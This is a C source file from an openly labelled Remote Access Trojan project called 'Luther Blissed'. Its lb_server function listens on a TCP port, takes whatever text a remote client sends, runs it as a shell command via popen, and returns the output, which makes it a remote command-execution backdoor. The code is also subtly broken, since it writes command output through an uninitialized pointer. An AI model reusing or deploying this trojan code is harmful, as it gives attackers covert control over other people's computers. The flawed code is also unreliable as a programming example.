/*
 *  Luther Blissed  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissed is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissed is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissed.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdalign.h>
#include <regex.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <sys/mount.h>
#include <linux/loop.h>
#include <fcntl.h>
#include <netinet/in.h>

#include <logs/slog.h>
#include <errors/errors.h>
#include <server/server.h>
#include <server/listener.h>

int lb_server(char HOST[], unsigned short PORT)
{
    int server_fd, new_socket;
    ssize_t valread;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    char buffer[1024] = {0};
    char *hello = "Server successfully works!";

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET,
                   SO_REUSEADDR, &opt,
                   sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr *)&address,
             sizeof(address)) < 0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address,
                             &addrlen)) < 0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    valread = read(new_socket, buffer,
                   1024 - 1); // subtract 1 for the null
                              // terminator at the end

    /**
     * Debug Logs
     */
    slog_display(SLOG_DEBUG, 1, DEBUG_LISTENING_ON);

    FILE *exec_process;
    char *process_buffer;

    if(parse_option(buffer) == -1) {
        exec_process = popen((char *)buffer, "r");
        fgets(process_buffer, 100, exec_process);
        send(new_socket, process_buffer, strlen(process_buffer), 0);
    }
    
    slog_display(SLOG_NOTE, 0, NOTE_MESSAGE_RECEIVED);
    printf("%s\n", buffer);

    
    send(new_socket, hello, strlen(hello), 0);
    slog_display(SLOG_DEBUG, 1, DEBUG_FIRST_PACKET_SENT);

    // closing the connected socket
    close(new_socket);
    // closing the listening socket
    close(server_fd);

    return 0;
}